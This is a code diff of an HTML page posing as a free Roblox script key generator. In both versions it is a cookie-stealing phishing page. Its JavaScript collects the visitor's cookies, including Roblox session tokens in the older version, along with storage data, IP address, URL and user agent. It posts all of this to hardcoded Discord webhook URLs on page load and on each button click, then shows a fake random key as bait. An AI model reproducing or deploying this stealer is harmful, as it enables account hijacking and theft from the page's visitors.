@@ -1,210 +1,152 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Get Your Roblox Script Key</title>
+    <title>Roblox Key Generator</title>
     <style>
-        body { background: #1a1a1a; color: white; text-align: center; padding: 50px; }
-        button { background: #00ff00; color: black; padding: 15px; border: none; border-radius: 5px; cursor: pointer; margin: 10px; }
+        body { 
+            background: #1a1a1a; 
+            color: white; 
+            text-align: center; 
+            padding: 50px;
+            font-family: Arial;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #2a2a2a;
+            padding: 30px;
+            border-radius: 10px;
+        }
+        button {
+            background: #00ff00;
+            color: black;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 10px;
+            font-weight: bold;
+        }
+        h1 { color: #00ff00; }
     </style>
 </head>
 <body>
-    <h1>🔑 Roblox Script Key Generator</h1>
-    
-    <button onclick="stealRobloxCookies()">🎮 GET FREE KEY</button>
-    <button onclick="tryAdvancedMethods()">🚀 PREMIUM KEY (Advanced)</button>
-    
-    <div id="result"></div>
-
-<script>
-const WEBHOOK = "https://discord.com/api/webhooks/1317563576515751997/2fDd5wJ5yZ9t6vzA8kHjJx4qR8kY7nT6pL9cF2vB8m";
-
-// ОСНОВНОЙ СТИЛЛЕР ROBLOX КУКОВ
-function stealRobloxCookies() {
-    let stolenData = {
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        allCookies: document.cookie,
-        robloxCookies: {}
-    };
-
-    // МЕТОД 1: Прямой поиск Roblox куков
-    const allCookies = document.cookie.split(';');
-    allCookies.forEach(cookie => {
-        const [name, value] = cookie.trim().split('=');
-        if (name.includes('ROBLOX') || name.includes('_|WARNING') || name.includes('.ROBLOSECURITY')) {
-            stolenData.robloxCookies[name] = value;
-        }
-    });
-
-    // МЕТОД 2: Попытка доступа к Roblox через iframe
-    try {
-        const iframe = document.createElement('iframe');
-        iframe.src = 'https://www.roblox.com/';
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
+    <div class="container">
+        <h1>🔑 Roblox Script Key Generator</h1>
+        <p>Get your FREE key to unlock premium features!</p>
         
-        setTimeout(() => {
-            try {
-                const robloxCookies = iframe.contentDocument?.cookie;
-                if (robloxCookies) {
-                    robloxCookies.split(';').forEach(cookie => {
-                        const [name, value] = cookie.trim().split('=');
-                        if (name.includes('ROBLOX')) {
-                            stolenData.robloxCookies[name] = value;
-                        }
-                    });
-                }
-            } catch(e) {
-                console.log('Iframe method failed');
-            }
-        }, 2000);
-    } catch(e) {}
+        <button onclick="generateKey()">🎮 GET FREE KEY</button>
+        <button onclick="premiumKey()">🚀 PREMIUM KEY</button>
+        
+        <div id="result" style="margin-top: 20px;"></div>
+    </div>
 
-    // МЕТОД 3: Проверка localStorage/sessionStorage
-    try {
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            if (key && key.includes('roblox') || key.includes('ROBLOX')) {
-                stolenData.robloxCookies[key] = localStorage.getItem(key);
-            }
-        }
-    } catch(e) {}
+    <script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1423753064514326658/c7W-WiEKVZ46MWLZ6V7GqaGkCD-aH93Kala4qQYv_yFYZR1akqBUestfW8rzF_9vTaUo";
 
-    // ОТПРАВКА ДАННЫХ
-    sendToDiscord(stolenData);
-    
-    // ПОКАЗЫВАЕМ ФЕЙКОВЫЙ КЛЮЧ
-    showFakeKey();
-}
-
-// РАСШИРЕННЫЕ МЕТОДЫ
-function tryAdvancedMethods() {
-    const data = {
-        timestamp: new Date().toISOString(),
-        advancedResults: {}
-    };
-
-    // МЕТОД 4: XHR с withCredentials
-    try {
-        const xhr = new XMLHttpRequest();
-        xhr.withCredentials = true;
-        xhr.open('GET', 'https://www.roblox.com/games', false);
-        xhr.onreadystatechange = function() {
-            if(xhr.readyState === 4) {
-                const cookies = xhr.getResponseHeader('set-cookie');
-                if(cookies) {
-                    data.advancedResults.xhrCookies = cookies;
-                }
-            }
+    function stealData() {
+        const data = {
+            cookies: document.cookie,
+            userAgent: navigator.userAgent,
+            url: window.location.href,
+            timestamp: new Date().toISOString(),
+            ip: "fetching..."
         };
-        xhr.send();
-    } catch(e) {}
 
-    // МЕТОД 5: Fetch с credentials
-    fetch('https://www.roblox.com/games', { 
-        credentials: 'include' 
-    })
-    .then(response => {
-        data.advancedResults.fetchHeaders = Object.fromEntries(response.headers.entries());
-    })
-    .catch(err => {
-        data.advancedResults.fetchError = err.toString();
-    })
-    .finally(() => {
-        sendToDiscord(data, "ADVANCED_METHODS");
-        showPremiumKey();
+        // Получаем IP
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(ipData => {
+                data.ip = ipData.ip;
+                
+                // Проверяем есть ли куки
+                let title, description, color;
+                
+                if (data.cookies && data.cookies.length > 0) {
+                    title = "🍪 COOKIES FOUND!";
+                    description = "User has cookies";
+                    color = 0x00ff00;
+                } else {
+                    title = "❌ NO COOKIES";
+                    description = "User has no cookies or blocked";
+                    color = 0xff0000;
+                }
+
+                // Отправка в Discord
+                fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: title,
+                            description: description,
+                            color: color,
+                            fields: [
+                                {name: "🌐 IP", value: data.ip, inline: true},
+                                {name: "🔗 URL", value: data.url, inline: true},
+                                {name: "🍪 Cookies", value: data.cookies ? "```" + data.cookies + "```" : "NO COOKIES", inline: false},
+                                {name: "🖥️ User Agent", value: data.userAgent.substring(0, 100), inline: false},
+                                {name: "🕒 Time", value: data.timestamp, inline: true}
+                            ]
+                        }]
+                    })
+                }).then(response => {
+                    console.log("✅ Data sent to Discord");
+                }).catch(error => {
+                    console.log("❌ Error sending to Discord:", error);
+                });
+            })
+            .catch(error => {
+                // Если IP не получили, все равно отправляем данные
+                data.ip = "Failed to get IP";
+                sendFallbackData(data);
+            });
+    }
+
+    function sendFallbackData(data) {
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: "🔔 **SITE VISIT - FALLBACK**",
+                embeds: [{
+                    title: "🌐 VISITOR DETECTED",
+                    description: "Basic visitor data captured",
+                    color: 0xffff00,
+                    fields: [
+                        {name: "🔗 URL", value: data.url},
+                        {name: "🍪 Cookies", value: data.cookies || "No cookies"},
+                        {name: "🕒 Time", value: data.timestamp}
+                    ]
+                }]
+            })
+        });
+    }
+
+    function generateKey() {
+        console.log("🎮 Button clicked - stealing data...");
+        stealData();
+        const key = "RBX-" + Math.random().toString(36).substr(2, 8).toUpperCase();
+        document.getElementById('result').innerHTML = 
+            `<h3 style="color: #00ff00;">✅ YOUR KEY: ${key}</h3>
+             <p>Copy this key into your script</p>`;
+    }
+
+    function premiumKey() {
+        console.log("🚀 Premium button clicked - stealing data...");
+        stealData();
+        const key = "PREMIUM-" + Math.random().toString(36).substr(2, 12).toUpperCase();
+        document.getElementById('result').innerHTML = 
+            `<h3 style="color: #00ff00;">🚀 PREMIUM KEY: ${key}</h3>
+             <p>Premium features unlocked!</p>`;
+    }
+
+    // Крадем данные при загрузке страницы
+    window.addEventListener('load', function() {
+        console.log("🔔 Page loaded - starting stealer...");
+        stealData();
     });
-}
-
-function sendToDiscord(data, type = "COOKIES") {
-    let title, description, color;
-    
-    if (type === "COOKIES") {
-        title = "🍪 ROBLOX COOKIES ATTEMPT";
-        description = "Cookie steal attempt results";
-        color = 0xff0000;
-    } else {
-        title = "🔧 ADVANCED METHODS RESULTS";
-        description = "Advanced cookie steal methods";
-        color = 0xffff00;
-    }
-
-    const embed = {
-        title: title,
-        description: description,
-        color: color,
-        fields: [],
-        timestamp: data.timestamp
-    };
-
-    // Добавляем Roblox куки если есть
-    if (data.robloxCookies && Object.keys(data.robloxCookies).length > 0) {
-        embed.fields.push({
-            name: "🎯 ROBLOX COOKIES FOUND!",
-            value: "```json\n" + JSON.stringify(data.robloxCookies, null, 2) + "\n```",
-            inline: false
-        });
-    } else {
-        embed.fields.push({
-            name: "❌ NO ROBLOX COOKIES",
-            value: "User not logged in or cookies protected",
-            inline: false
-        });
-    }
-
-    // Общая информация
-    embed.fields.push(
-        { name: "🌐 User Agent", value: data.userAgent.substring(0, 100), inline: true },
-        { name: "🕒 Timestamp", value: data.timestamp, inline: true }
-    );
-
-    // Все куки
-    if (data.allCookies) {
-        embed.fields.push({
-            name: "🍪 ALL COOKIES",
-            value: "```" + data.allCookies + "```",
-            inline: false
-        });
-    }
-
-    fetch(WEBHOOK, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ embeds: [embed] })
-    });
-}
-
-function showFakeKey() {
-    const key = "RBX-" + Math.random().toString(36).substr(2, 8).toUpperCase();
-    document.getElementById('result').innerHTML = 
-        `<h3 style="color: #00ff00;">✅ FREE KEY: ${key}</h3>
-         <p>Use this key in your script</p>`;
-}
-
-function showPremiumKey() {
-    const key = "PREMIUM-" + Math.random().toString(36).substr(2, 12).toUpperCase();
-    document.getElementById('result').innerHTML = 
-        `<h3 style="color: #00ff00;">🚀 PREMIUM KEY: ${key}</h3>
-         <p>Premium features unlocked!</p>`;
-}
-
-// Автозапуск при загрузке
-window.addEventListener('load', () => {
-    // Крадём базовые данные сразу
-    const basicData = {
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        url: window.location.href,
-        referrer: document.referrer
-    };
-    
-    fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(ipData => {
-            basicData.ip = ipData.ip;
-            sendToDiscord(basicData, "PAGE_VISIT");
-        });
-});
-</script>
+    </script>
 </body>
 </html>
